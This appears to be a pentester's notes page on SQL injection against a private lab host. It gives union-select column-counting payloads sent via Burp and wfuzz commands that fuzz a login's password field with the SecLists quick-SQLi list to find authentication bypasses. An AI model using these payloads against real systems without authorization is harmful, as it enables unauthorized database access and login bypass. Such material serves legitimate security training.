---
description: 300-348
---

# SQLi

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" %}

## Manual MSSQL Injection

Do you see a seemingly vulnerable input field that you believe queries the database?

<mark style="color:yellow;">Make a request to it and capture it in burp // send to repeater tab</mark>

```
q=500' union select 1 -- 
q=500' union select 1,2 -- 
q=500' union select 1,2,3 -- 
q=500' union select 1,2,3,4 -- 
q=500' union select 1,2,3,4,5 -- 
q=500' union select 1,2,3,4,5,6,7 -- 
q=500' union select 1,2,3,4,5,6,7,8 -- 
```

* Be sure to check the response tab after you send every request as you do not know when it will return data!

## Semi-Automatic SQLi

{% embed url="https://www.youtube.com/watch?v=c2OFrDVb3EM&t=2558s" %}
Go to 45 mins
{% endembed %}

1. Set URL variable ($URL) to your target you are attacking

```
export URL=http://192.168.1.181/index.php
echo $URL
```

&#x20; 2\. Find the backend processing for the handling of your input in the web application

* View source code
* Search for form elements they look like this: <mark style="color:yellow;">\<form</mark>
* Locate the script or action that it takes within that line of code it should be executing a php file
  * i.e. if it is <mark style="color:yellow;">checklogin.php</mark>
  * Make it your URL variable

```
export URL="http://192.168.1.181:80/checklogin.php"
```

&#x20;  3\. Locate quick-SQLi.txt, it should be something like: usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt

&#x20;  4\. Load up wfuzz:

* Check <mark style="color:yellow;">\<input name</mark>, in this case, it is <mark style="color:yellow;">myusername</mark>

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "myusername=admin&mypassword=FUZZ&Submit=Login" --hc 404 "$URL"
```

* You may get get a lot back
* Look at the chars
* Go back to the web app and manually authenticate using that payload and username
* Go through them until you get an error
* Determine what a valid and invalid error is depending on char size
* Be sure to block out the invalid errors in wfuzz as seen below
* For example, these chars are 109 and 444

```
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "myusername=admin&mypassword=FUZZ&Submit=Login" --hc 404 --hh 109,444 "$URL"
```

* Anything you get now should be attempted manually once more in the browser
